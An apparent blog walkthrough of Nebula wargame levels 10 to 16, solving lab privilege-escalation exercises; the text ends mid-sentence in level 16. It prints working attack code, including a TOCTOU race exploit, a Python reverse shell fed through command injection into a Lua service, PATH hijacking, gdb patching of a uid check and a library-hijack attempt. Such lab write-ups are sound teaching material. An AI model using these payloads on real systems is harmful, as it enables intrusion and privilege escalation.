Title: Nebula Wargame walkthrough Level 10-19
Date: 2015-09-29 10:30
Modified: 2015-10-23 17:26
Author: Nikolai Tschacher
Summary: Walkthrough of nebula wargame from level 10 to level 19
Category: Wargames
Tags: Linux, Programming, Security, Problem Solving
Slug: nebula-wargame-walkthrough-level-10-19
Status: published


## Preface

In the last [blog post]({filename}/Wargames/nebula-wargame-walkthrough.md) I covered the Nebula Wargame levels from 0 to 9. Now I will
try to solve the levels 10 to 19. In this blog post I am sharing my thoughts by trying to solve these linux shell exploit exercises.


## Level 10 - Race conditions in network applications

This level was quite hard for me, compared to the other levels before!

There are two files in the `/home/flag10` directory:

+ The `/home/flag10/flag10` setuid binary 
+ A token file which we want to read

The setuid binary was compiled from the following code:


	:::c
	#include <stdlib.h>
	#include <unistd.h>
	#include <sys/types.h>
	#include <stdio.h>
	#include <fcntl.h>
	#include <errno.h>
	#include <sys/socket.h>
	#include <netinet/in.h>
	#include <string.h>

	int main(int argc, char **argv)
	{
	  char *file;
	  char *host;

	  if(argc < 3) {
	    printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
	    exit(1);
	  }

	  file = argv[1];
	  host = argv[2];

	  if(access(argv[1], R_OK) == 0) {
	    int fd;
	    int ffd;
	    int rc;
	    struct sockaddr_in sin;
	    char buffer[4096];

	    printf("Connecting to %s:18211 .. ", host); fflush(stdout);

	    fd = socket(AF_INET, SOCK_STREAM, 0);

	    memset(&sin, 0, sizeof(struct sockaddr_in));
	    sin.sin_family = AF_INET;
	    sin.sin_addr.s_addr = inet_addr(host);
	    sin.sin_port = htons(18211);

	    if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) {
	      printf("Unable to connect to host %s\n", host);
	      exit(EXIT_FAILURE);
	    }

	#define HITHERE ".oO Oo.\n"
	    if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
	      printf("Unable to write banner to host %s\n", host);
	      exit(EXIT_FAILURE);
	    }
	#undef HITHERE

	    printf("Connected!\nSending file .. "); fflush(stdout);

	    ffd = open(file, O_RDONLY);
	    if(ffd == -1) {
	      printf("Damn. Unable to open file\n");
	      exit(EXIT_FAILURE);
	    }

	    rc = read(ffd, buffer, sizeof(buffer));
	    if(rc == -1) {
	      printf("Unable to read from file: %s\n", strerror(errno));
	      exit(EXIT_FAILURE);
	    }

	    write(fd, buffer, rc);

	    printf("wrote file!\n");

	  } else {
	    printf("You don't have access to %s\n", file);
	  }
	}
	}


Only after reading the notes in `man access` it became clear to me how to attack this application. In the manual notes, it is written:


> Warning: Using `access()` to check if a user is authorized to, for example, open a file before actually doing so using `open(2)` creates a security hole, because the
   user might exploit the short time interval between checking and opening the file to manipulate it.  For this reason, the  use  of  this  system  call  should  be
   avoided.   (In  the  example  just  described,  a  safer  alternative would be to temporarily switch the process's effective user ID to the real ID and then call
   `open(2)`.)

So we are going to exploit the fact that we can change the target of a symbolic (or static) link between the `access()` and `open()` system call! The fact that
the `connect()` system call is between the both makes it even more simple, because usually, `connect()` needs some time to finish.

My exploit is written in Python. I guess you could create a much simpler version in some lines of shell code (like using netcat). But sometimes it's also important
to write your own socket programs to exercise a bit.

	:::python
	#!/usr/bin/python

	import os
	import socket
	import threading
	import subprocess
	import time
	import sys
	import signal

	ip = '192.168.56.101'

	def run_server():
		pid = os.getpid()
		try:
			address = (ip, 18211)
			print('[i] About to run server on {}'.format(address))
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			s.bind(address)
			s.listen(5)
			
			while True:
				conn, address = s.accept()
				t = threading.Thread(target=handle_connection, args=(conn, address, pid))
				t.start()

		except KeyboardInterrupt:
			if s:
				s.close()
			sys.exit('Pressed Ctrl-C. Exiting...')

	def handle_connection(conn, address, serverpid):
		print('Incoming connection from {}'.format(address))
		# wait a second before receiving data
		time.sleep(1)
		banner = conn.recv(1024)	
		print(banner)

		token_contents = conn.recv(1024)
		print(token_contents)

		if token_contents.strip():
			os.kill(serverpid, signal.SIGKILL)
		
		
	def race_condition():
		"""
		First create a symbolic link to a file which we own
		to bypass the access() check, then change the link to
		the /home/flag10/token after access() was executed.
		"""
		os.chdir('/home/level10/')
		
		# create a file that user level10 owns
		os.system('echo "bla " >> /tmp/testfile')

		# create a link to the previously created file 
		os.system('ln -s -f /tmp/testfile /home/level10/link')

		# call the setuid binary in a non blocking fashion
		subprocess.Popen(['/home/flag10/flag10 /home/level10/link ' + ip], shell=True, 
					stdin=None, stdout=None, stderr=None, close_fds=True)

		# lets hope that access was alraedy executed but read() wasnt't
		# because the connection is still awaiting to get accepted.
		# then change the link location to the token file :)
		os.system('ln -s -f /home/flag10/token /home/level10/link')

		
	def main():
		server = threading.Thread(target=run_server)
		server.start()

		race_condition()

	if __name__ == '__main__':
		main()


When calling the above program, it sometimes works, and sometimes it doesn't. It's probably because the `connect()` call
takes different amount of times. On a successful execution we get:

	:::bash
	level10@nebula:~$ python exploit.py 
	[i] About to run server on ('192.168.56.101', 18211)
	Connecting to 192.168.56.101:18211 .. Connected!
	Sending file .. wrote file!
	Incoming connection from ('192.168.56.101', 41962)
	.oO Oo.
	615a2ce1-b2b5-4c76-8eed-8aa5c4015c27


	^Z
	[1]+  Stopped(SIGTSTP)        python exploit.py

Testing the password:

	:::bash
	level10@nebula:~$ su flag10
	Password: 
	sh-4.2$ getflag
	You have successfully executed getflag on a target account
	sh-4.2$ 

## Level 11 - Exploiting with limited character lengths

The source code for the setuid binary in this level looks like the following:

	:::c
	include <stdlib.h>
	include <unistd.h>
	include <string.h>
	include <sys/types.h>
	include <fcntl.h>
	include <stdio.h>
	include <sys/mman.h>

	/*
	 * Return a random, non predictable file, and return the file descriptor for it.
	 */

	int getrand(char **path)
	{
	  char *tmp;
	  int pid;
	  int fd;

	  srandom(time(NULL));

	  tmp = getenv("TEMP");
	  pid = getpid();
	  
	  asprintf(path, "%s/%d.%c%c%c%c%c%c", tmp, pid, 
	    'A' + (random() % 26), '0' + (random() % 10), 
	    'a' + (random() % 26), 'A' + (random() % 26),
	    '0' + (random() % 10), 'a' + (random() % 26));

	  fd = open(*path, O_CREAT|O_RDWR, 0600);
	  unlink(*path);
	  return fd;
	}

	void process(char *buffer, int length)
	{
	  unsigned int key;
	  int i;

	  key = length & 0xff;

	  for(i = 0; i < length; i++) {
	    buffer[i] ^= key;
	    key -= buffer[i];
	  }

	  system(buffer);
	}

	#define CL "Content-Length: "

	int main(int argc, char **argv)
	{
	  char line[256];
	  char buf[1024];
	  char *mem;
	  int length;
	  int fd;
	  char *path;

	  if(fgets(line, sizeof(line), stdin) == NULL) {
	    errx(1, "reading from stdin");
	  }

	  if(strncmp(line, CL, strlen(CL)) != 0) {
	    errx(1, "invalid header");
	  }

	  length = atoi(line + strlen(CL));
	  
	  if(length < sizeof(buf)) {
	    if(fread(buf, length, 1, stdin) != length) {
	      err(1, "fread length");
	    }
	    process(buf, length);
	  } else {
	    int blue = length;
	    int pink;

	    fd = getrand(&path);

	    while(blue > 0) {
	      printf("blue = %d, length = %d, ", blue, length);

	      pink = fread(buf, 1, sizeof(buf), stdin);
	      printf("pink = %d\n", pink);

	      if(pink <= 0) {
	        err(1, "fread fail(blue = %d, length = %d)", blue, length);
	      }
	      write(fd, buf, pink);

	      blue -= pink;
	    }  

	    mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
	    if(mem == MAP_FAILED) {
	      err(1, "mmap");
	    }
	    process(mem, length);
	   }

	}


This level is not as easy as it seems first. There should be two ways to exploit this code. The first way reads
one byte of data into a buffer and then calls `process(buf)` on it. `process()` xors the buffer contents with itself 
and a key. So we can easily execute one byte/char with system. But how to call getflag with it?

See the question here <http://stackoverflow.com/questions/556194/calling-a-script-from-a-setuid-root-c-program-script-does-not-run-as-root>


What I tried was the following:

	:::bash
	# Change to the flag account
	cd /home/flag11
	# create a bash script in the /home/level11 directory
	echo -e '#!/bin/bash\n/bin/sh' > ~/s
	# make it executable
	chmod +x ~/s
	# set the path to include our home directory
	PATH=$PATH:/home/level11/
	# execute the flag11 binary with the payload such that process will execute
	# system('s'). The char 'r' will be xored with 1, which yields 's'
	# you need to repeat this some times until the proper payload is executed.
	python -c 's = "Content-Length: 1\nr"; print(s);' | ./flag11


But It seems like `system()` doesn't interpret setuid scripts...

I tried it with a C program instead of a bash script, compiled it and saved the executable to
`~/s` and tried it again:

	:::C
	#include <stdlib.h>
	#include <stdio.h>

	int main(int argc, char** argv) {
		// flag11 is 988, level11 is 1012
		uid_t euid = geteuid();
	    
	    if (setresuid(euid, euid, euid) == -1) {
			printf("Couldn't set euid and ruid\n");
	    }
	    printf("* getuid()=%d, geteuid()=%d\n", getuid(), geteuid());
	    system("/bin/bash");

	    return 0;
	}


	:::bash
	level11@nebula:/home/flag11$ python -c 's = "Content-Length: 1\nr"; print(s);' | ./flag11 
	Couldn't set euid and ruid
	* getuid()=1012, geteuid()=1012


Still doesn't work. This is a bug. The setuid C program should probably not call `system()`, because as 
`man 3 system` states:

> system() will not, in fact, work properly from programs with
> set-user-ID or set-group-ID privileges on systems on which /bin/sh is bash version 2, since bash 2 drops privileges on startup.

See here a proof that there is a bug: <http://73696e65.github.io/blog/2015/06/18/exploit-exercises-nebula-11-15/>

There's the second way to exploit this vulnerability, when the input is longer than 1024 bytes. For this you need to pre-encode
the payload with the reverse of the `process()` algorithm. I didn't do this, because it works very similar to the previous approach.


## Level 12 - Command Injections in double quoted strings

This level is about a simple command injection vulnearability in Lua. The code of the vulnearble program is below:

	:::lua
	local socket = require("socket")
	local server = assert(socket.bind("127.0.0.1", 50001))

	function hash(password) 
		prog = io.popen("echo "..password.." | sha1sum", "r")
		data = prog:read("*all")
		prog:close()

		data = string.sub(data, 1, 40)

		return data
	end


	while 1 do
		local client = server:accept()
		client:send("Password: ")
		client:settimeout(60)
		local line, err = client:receive()
		if not err then
			print("trying " .. line) -- log from where ;\
			local h = hash(line)

			if h ~= "4754a4f4bd5787accd33de887b9250a0691dd198" then
				client:send("Better luck next time\n");
			else
				client:send("Congrats, your token is 413**CARRIER LOST**\n")
			end

		end

		client:close()
	end

In opens a server on localhost:50001 and asks for a password. The password then is hashed with some bash utilites
in a `popen()` call and compared with the sha1 sum `4754a4f4bd5787accd33de887b9250a0691dd198`. But of course
we don't need to find the password that is hashed to the target hash. We can just inject a command and then 
launch a backdor.

To exploit it, I created a simple connect back backdoor (reverse backdoor) script in Python
(inspred by <http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>):

	:::python
	#!/usr/bin/python
	import socket,subprocess,os

	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(("127.0.0.1",8888))
	os.dup2(s.fileno(),0)
	os.dup2(s.fileno(),1)
	os.dup2(s.fileno(),2)
	p=subprocess.call(["/bin/sh","-i"])

Then I saved it to `/tmp/bd.py` and launched the attack:

	:::bash
	# first start listening for incoming backdoor connections
	nc -l localhost 8888
	# then attack in a different shell terminal
	cd /home/flag12
	echo -e '$(/tmp/bd.py)\n' | nc localhost 50001

The overall payload that is executed on the Lua script becomes `echo $(/tmp/bd.py) | sha1sum`
which will substitute and execute the string between `$(..)` and thus execute the backdoor:

	:::bash
	level12@nebula:~$ netcat -l localhost 8888
	sh: no job control in this shell
	sh-4.2$ getflag
	getflag
	You have successfully executed getflag on a target account
	sh-4.2$


## Level 13 - Using gdb to trace a program

In this level the code checks whether we are id 1000. If so, it proceeds to give us a
access token for the `flag13` account. But the token must be somewhere in the binary, otherwise
it couldn't be printed out (assuming it isn't retrieved from somewhere else).

A quick check with `strings flag13` shows us:

	:::text
	level13@nebula:/home/flag13$ strings flag13 
	/lib/ld-linux.so.2
	__gmon_start__
	libc.so.6
	_IO_stdin_used
	exit
	puts
	__stack_chk_fail
	printf
	getuid
	__libc_start_main
	GLIBC_2.4
	GLIBC_2.0
	PTRhp
	UWVS
	[^_]
	Security failure detected. UID %d started us, we expect %d
	The system administrators will be notified of this violation
	8mjomjh8wml;bwnh8jwbbnnwi;>;88?o;9ob
	your token is %s
	;*2$"(

The string `8mjomjh8wml;bwnh8jwbbnnwi;>;88?o;9ob` looks like a token. But it isn't the password for the `flag13` account.

So let's play with the binary with gdb and disassemble it:

	:::assembly
	(gdb) set disassembly-flavor intel
	(gdb) disassemble main
	Dump of assembler code for function main:
	0x080484c4 <+0>:	push   ebp
	0x080484c5 <+1>:	mov    ebp,esp
	0x080484c7 <+3>:	push   edi
	0x080484c8 <+4>:	push   ebx
	0x080484c9 <+5>:	and    esp,0xfffffff0
	0x080484cc <+8>:	sub    esp,0x130
	0x080484d2 <+14>:	mov    eax,DWORD PTR [ebp+0xc]
	0x080484d5 <+17>:	mov    DWORD PTR [esp+0x1c],eax
	0x080484d9 <+21>:	mov    eax,DWORD PTR [ebp+0x10]
	0x080484dc <+24>:	mov    DWORD PTR [esp+0x18],eax
	0x080484e0 <+28>:	mov    eax,gs:0x14
	0x080484e6 <+34>:	mov    DWORD PTR [esp+0x12c],eax
	0x080484ed <+41>:	xor    eax,eax
	0x080484ef <+43>:	call   0x80483c0 <getuid@plt>
	0x080484f4 <+48>:	cmp    eax,0x3e8
	0x080484f9 <+53>:	je     0x8048531 <main+109>
	0x080484fb <+55>:	call   0x80483c0 <getuid@plt>
	0x08048500 <+60>:	mov    edx,0x80486d0
	0x08048505 <+65>:	mov    DWORD PTR [esp+0x8],0x3e8
	0x0804850d <+73>:	mov    DWORD PTR [esp+0x4],eax
	0x08048511 <+77>:	mov    DWORD PTR [esp],edx
	0x08048514 <+80>:	call   0x80483a0 <printf@plt>
	0x08048519 <+85>:	mov    DWORD PTR [esp],0x804870c
	0x08048520 <+92>:	call   0x80483d0 <puts@plt>
	0x08048525 <+97>:	mov    DWORD PTR [esp],0x1
	0x0804852c <+104>:	call   0x80483f0 <exit@plt>
	0x08048531 <+109>:	lea    eax,[esp+0x2c]
	0x08048535 <+113>:	mov    ebx,eax
	0x08048537 <+115>:	mov    eax,0x0
	0x0804853c <+120>:	mov    edx,0x40
	0x08048541 <+125>:	mov    edi,ebx
	0x08048543 <+127>:	mov    ecx,edx
	0x08048545 <+129>:	rep stos DWORD PTR es:[edi],eax
	0x08048547 <+131>:	mov    edx,0x804874c
	0x0804854c <+136>:	lea    eax,[esp+0x2c]
	0x08048550 <+140>:	mov    ecx,DWORD PTR [edx]
	0x08048552 <+142>:	mov    DWORD PTR [eax],ecx
	0x08048554 <+144>:	mov    ecx,DWORD PTR [edx+0x4]
	0x08048557 <+147>:	mov    DWORD PTR [eax+0x4],ecx
	0x0804855a <+150>:	mov    ecx,DWORD PTR [edx+0x8]
	0x0804855d <+153>:	mov    DWORD PTR [eax+0x8],ecx
	0x08048560 <+156>:	mov    ecx,DWORD PTR [edx+0xc]
	0x08048563 <+159>:	mov    DWORD PTR [eax+0xc],ecx
	0x08048566 <+162>:	mov    ecx,DWORD PTR [edx+0x10]
	0x08048569 <+165>:	mov    DWORD PTR [eax+0x10],ecx
	0x0804856c <+168>:	mov    ecx,DWORD PTR [edx+0x14]
	0x0804856f <+171>:	mov    DWORD PTR [eax+0x14],ecx
	0x08048572 <+174>:	mov    ecx,DWORD PTR [edx+0x18]
	0x08048575 <+177>:	mov    DWORD PTR [eax+0x18],ecx
	0x08048578 <+180>:	mov    ecx,DWORD PTR [edx+0x1c]
	0x0804857b <+183>:	mov    DWORD PTR [eax+0x1c],ecx
	0x0804857e <+186>:	mov    ecx,DWORD PTR [edx+0x20]
	0x08048581 <+189>:	mov    DWORD PTR [eax+0x20],ecx
	0x08048584 <+192>:	movzx  edx,BYTE PTR [edx+0x24]
	0x08048588 <+196>:	mov    BYTE PTR [eax+0x24],dl
	0x0804858b <+199>:	mov    DWORD PTR [esp+0x28],0x0
	0x08048593 <+207>:	jmp    0x80485b4 <main+240>
	0x08048595 <+209>:	lea    eax,[esp+0x2c]
	0x08048599 <+213>:	add    eax,DWORD PTR [esp+0x28]
	0x0804859d <+217>:	movzx  eax,BYTE PTR [eax]
	0x080485a0 <+220>:	mov    edx,eax
	0x080485a2 <+222>:	xor    edx,0x5a
	0x080485a5 <+225>:	lea    eax,[esp+0x2c]
	0x080485a9 <+229>:	add    eax,DWORD PTR [esp+0x28]
	0x080485ad <+233>:	mov    BYTE PTR [eax],dl
	0x080485af <+235>:	add    DWORD PTR [esp+0x28],0x1
	0x080485b4 <+240>:	lea    eax,[esp+0x2c]
	0x080485b8 <+244>:	add    eax,DWORD PTR [esp+0x28]
	0x080485bc <+248>:	movzx  eax,BYTE PTR [eax]
	0x080485bf <+251>:	test   al,al
	0x080485c1 <+253>:	jne    0x8048595 <main+209>
	0x080485c3 <+255>:	mov    eax,0x8048771
	0x080485c8 <+260>:	lea    edx,[esp+0x2c]
	0x080485cc <+264>:	mov    DWORD PTR [esp+0x4],edx
	0x080485d0 <+268>:	mov    DWORD PTR [esp],eax
	0x080485d3 <+271>:	call   0x80483a0 <printf@plt>
	0x080485d8 <+276>:	mov    edx,DWORD PTR [esp+0x12c]
	0x080485df <+283>:	xor    edx,DWORD PTR gs:0x14
	0x080485e6 <+290>:	je     0x80485ed <main+297>
	0x080485e8 <+292>:	call   0x80483b0 <__stack_chk_fail@plt>
	0x080485ed <+297>:	lea    esp,[ebp-0x8]
	0x080485f0 <+300>:	pop    ebx
	0x080485f1 <+301>:	pop    edi
	0x080485f2 <+302>:	pop    ebp
	0x080485f3 <+303>:	ret

As you can see the assembly shows us that in the following snippet it is decided whether the call
to getuid() returns 1000 or not:

	:::asm
	0x080484f4 <+48>:	cmp    eax,0x3e8
	0x080484f9 <+53>:	je     0x8048531 <main+109>

If the jump is taken, we continue at `main+109`. There, some decoding happens. In fact, the
lines:

	:::asm
	0x08048547 <+131>:	mov    edx,0x804874c
	0x0804854c <+136>:	lea    eax,[esp+0x2c]

grab the string `8mjomjh8wml;bwnh8jwbbnnwi;>;88?o;9ob` from the `.data` section and prepare some
buffer on the stack for further processing. I don't exactly what decoding happens in the following
`mov` statements, but it is the reason why the token doesn't work right away as login password for the flag13 account.
It is first transformed.
Anyways, we just set the eax flag to contain 1000 instead of our `getuid()` return value to circumwent the check
and let the program decode the token for us:

	:::text
	level13@nebula:/home/flag13$ gdb flag13 
	GNU gdb (Ubuntu/Linaro 7.3-0ubuntu2) 7.3-2011.08
	<...snipp...>
	(gdb) break *(main+48)
	Breakpoint 1 at 0x80484f4
	(gdb) r
	Starting program: /home/flag13/flag13 

	Breakpoint 1, 0x080484f4 in main ()
	(gdb) i r
	eax            0x3f6	1014
	ecx            0xbfa37f54	-1079804076
	edx            0xbfa37ee4	-1079804188
	ebx            0x287ff4	2654196
	esp            0xbfa37d80	0xbfa37d80
	ebp            0xbfa37eb8	0xbfa37eb8
	esi            0x0	0
	edi            0x0	0
	eip            0x80484f4	0x80484f4 <main+48>
	eflags         0x282	[ SF IF ]
	cs             0x73	115
	ss             0x7b	123
	ds             0x7b	123
	es             0x7b	123
	fs             0x0	0
	gs             0x33	51
	(gdb) set $eax = 1000
	(gdb) continue
	Continuing.
	your token is b705702b-76a8-42b0-8844-3adabbe5ac58
	[Inferior 1 (process 2096) exited with code 063]
	(gdb) quit
	level13@nebula:/home/flag13$ su flag13
	Password: 
	sh-4.2$ getflag
	You have successfully executed getflag on a target account
	sh-4.2$


## Level 14 - Decryping simple enryption


This level is also quite easy. The setuid binary `/home/flag14/flag14` encrypts input. When we call the 
application `./flag14 -e` and always enter the same character and press escape, we see that the app outputs
always the next character.

Then we have a file with a encrypted token for the account `flag14`. 

	:::bash
	level14@nebula:/home/flag14$ xxd token 
	0000000: 3835 373a 6736 373f 3541 4242 6f3a 4274  857:g67?5ABBo:Bt
	0000010: 4441 3f74 4976 4c44 4b4c 7b4d 5150 5352  DA?tIvLDKL{MQPSR
	0000020: 5157 572e 0a                             QWW..

To decrypt it, I created a simple python script the reverses the encryption logic:

	:::python
	#!/usr/bin/python

	def decrypt(s):
		"""
		Each input character is encoded like this:
		enc(char_i) = chr(ord(char) + i)

		This means that the first input character is mapped to itself and the
		nth character is mapped to enc(char_n) = chr(ord(char) + n)
		"""

		out = ''
		for i, c in enumerate(s):
			out += chr(ord(c) - i)

		return out


	def main():
		print decrypt('857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW\x2e')


	main()


Executing this yields the token `8457c118-887c-4e40-a5a6-33a25353165` which is the password for
the flag14 account.


## Level 15 - Injecting own shared libraries

When we call `/home/flag15/flag15` it outputs 
> strace it!

So I straced it:

	:::bash
	level15@nebula:/home/flag15$ strace ./flag15 
	execve("./flag15", ["./flag15"], [/* 28 vars */]) = 0
	brk(0)                                  = 0x8750000
	access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
	mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7879000
	access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
	open("/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
	stat64("/var/tmp/flag15/tls/i686/sse2/cmov", 0xbfe04ec4) = -1 ENOENT (No such file or directory)
	open("/var/tmp/flag15/tls/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
	stat64("/var/tmp/flag15/tls/i686/sse2", 0xbfe04ec4) = -1 ENOENT (No such file or directory)
	open("/var/tmp/flag15/tls/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
	stat64("/var/tmp/flag15/tls/i686/cmov", 0xbfe04ec4) = -1 ENOENT (No such file or directory)
	open("/var/tmp/flag15/tls/i686/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
	stat64("/var/tmp/flag15/tls/i686", 0xbfe04ec4) = -1 ENOENT (No such file or directory)
	open("/var/tmp/flag15/tls/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
	stat64("/var/tmp/flag15/tls/sse2/cmov", 0xbfe04ec4) = -1 ENOENT (No such file or directory)
	open("/var/tmp/flag15/tls/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
	stat64("/var/tmp/flag15/tls/sse2", 0xbfe04ec4) = -1 ENOENT (No such file or directory)
	open("/var/tmp/flag15/tls/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
	stat64("/var/tmp/flag15/tls/cmov", 0xbfe04ec4) = -1 ENOENT (No such file or directory)
	open("/var/tmp/flag15/tls/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
	stat64("/var/tmp/flag15/tls", 0xbfe04ec4) = -1 ENOENT (No such file or directory)
	open("/var/tmp/flag15/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
	stat64("/var/tmp/flag15/i686/sse2/cmov", 0xbfe04ec4) = -1 ENOENT (No such file or directory)
	open("/var/tmp/flag15/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
	stat64("/var/tmp/flag15/i686/sse2", 0xbfe04ec4) = -1 ENOENT (No such file or directory)
	open("/var/tmp/flag15/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
	stat64("/var/tmp/flag15/i686/cmov", 0xbfe04ec4) = -1 ENOENT (No such file or directory)
	open("/var/tmp/flag15/i686/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
	stat64("/var/tmp/flag15/i686", 0xbfe04ec4) = -1 ENOENT (No such file or directory)
	open("/var/tmp/flag15/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
	stat64("/var/tmp/flag15/sse2/cmov", 0xbfe04ec4) = -1 ENOENT (No such file or directory)
	open("/var/tmp/flag15/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
	stat64("/var/tmp/flag15/sse2", 0xbfe04ec4) = -1 ENOENT (No such file or directory)
	open("/var/tmp/flag15/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
	stat64("/var/tmp/flag15/cmov", 0xbfe04ec4) = -1 ENOENT (No such file or directory)
	open("/var/tmp/flag15/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
	stat64("/var/tmp/flag15", {st_mode=S_IFDIR|0775, st_size=60, ...}) = 0
	open("/etc/ld.so.cache", O_RDONLY)      = 3
	fstat64(3, {st_mode=S_IFREG|0644, st_size=33815, ...}) = 0
	mmap2(NULL, 33815, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7870000
	close(3)                                = 0
	access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
	open("/lib/i386-linux-gnu/libc.so.6", O_RDONLY) = 3
	read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\222\1\0004\0\0\0"..., 512) = 512
	fstat64(3, {st_mode=S_IFREG|0755, st_size=1544392, ...}) = 0
	mmap2(NULL, 1554968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x110000
	mmap2(0x286000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x176) = 0x286000
	mmap2(0x289000, 10776, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x289000
	close(3)                                = 0
	mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb786f000
	set_thread_area({entry_number:-1 -> 6, base_addr:0xb786f8d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
	mprotect(0x286000, 8192, PROT_READ)     = 0
	mprotect(0x8049000, 4096, PROT_READ)    = 0
	mprotect(0x8e6000, 4096, PROT_READ)     = 0
	munmap(0xb7870000, 33815)               = 0
	fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
	mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7878000
	write(1, "strace it!\n", 11strace it!
	)            = 11
	exit_group(11)                          = ?


As you can see the dynamic linker tries to load the `libc` from the directory `/var/tmp/flag15/`. This is a very unusual 
path and a quick check reveals that this directory is owned by user `level15`, which means we can write to it.

	:::bash
	level15@nebula:/home/flag15$ ls -dl /var/tmp/flag15/
	drwxrwxr-x 1 level15 level15 60 Oct  4 13:59 /var/tmp/flag15/

After having tried some paths in `/var/tmp/flag15/`, the dynamic linker finally finds it libc in 
`/lib/i386-linux-gnu/libc.so.6` and loads it into memory:

	:::bash
	open("/lib/i386-linux-gnu/libc.so.6", O_RDONLY) = 3
	read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\222\1\0004\0\0\0"..., 512) = 512

The basic idea is to create our own libc and patch the `puts()` function that is used.
As we can see in the strace output, the string `strace it!` is written with the `write()` function
call at the end.

What if we could patch the `write()` system call?

Let's try it. I created the following C program:

	:::C
	#include <stdlib.h>
	#include <stdio.h>

	#define _GNU_SOURCE

	int write(int fd, const char* buf) {
		if (strcmp(buf, "strace it!\n") == 0) {
			printf("Inside hook!\n");
			system("/bin/getflag >> /tmp/flagged");
		}
		return 0;
	}

and issued the following commands:

	:::bash
	level15@nebula:/home/flag15$ cat /tmp/write.c
	#include <stdlib.h>
	#include <stdio.h>

	#define _GNU_SOURCE

	int write(int fd, const char* buf) {
		if (strcmp(buf, "strace it!\n") == 0) {
			printf("Inside hook!\n");
			system("/bin/getflag >> /tmp/flagged");
		}
		return 0;
	}
	level15@nebula:/home/flag15$ gcc -Wall -fPIC -shared -o /var/tmp/flag15/libc.so.6 /tmp/write.c 
	/tmp/write.c: In function ‘write’:
	/tmp/write.c:7:2: warning: implicit declaration of function ‘strcmp’ [-Wimplicit-function-declaration]
	level15@nebula:/home/flag15$ ./flag15 
	./flag15: /var/tmp/flag15/libc.so.6: no version information available (required by ./flag15)
	./flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
	./flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
	./flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference


Seems like it isn't so easy to create a own `libc`. But this is definitely the correct direction to investigate further.


## Level 16 - exploiting with uppercase only charset

In this level we need to exploit a cgi web application that is written in Perl.

	:::perl
	#!/usr/bin/env perl

	use CGI qw{param};

	print "Content-type: text/html\n\n";

	sub login {
		$username = $_[0];
		$password = $_[1];

		$username =~ tr/a-z/A-Z/;	# conver to uppercase
		$username =~ s/\s.*//;		# strip everything after a space

		@output = `egrep "^$username" /home/flag16/userdb.txt 2>&1`;
		foreach $line (@output) {
			($usr, $pw) = split(/:/, $line);
		

			if($pw =~ $password) { 
				return 1;
			}
		}

		return 0;
	}

	sub htmlz {
		print("<html><head><title>Login resuls</title></head><body>");
		if($_[0] == 1) {
			print("Your login was accepted<br/>");
		} else {
			print("Your login failed<br/>");
		}	
		print("Would you like a cookie?<br/><br/></body></html>\n");
	}

	htmlz(login(param("username"), param("password")));


The web app will execute a command `egrep "^$username" /home/flag16/userdb.txt 2>&1` where username
can be passed as a GET parameter. But before it is substituted in the above command, the username
variable is transformed to uppercase and all spaces (and chars which follow them) are removed.

So our payload will be uppercase and without spaces. This means we cannot create a shell script in
`/tmp` to run a arbitrary script, because paths are of course case sensitive.

And we cannot alter environment variables in the `/home/flag16` directory, nor can we write in the document
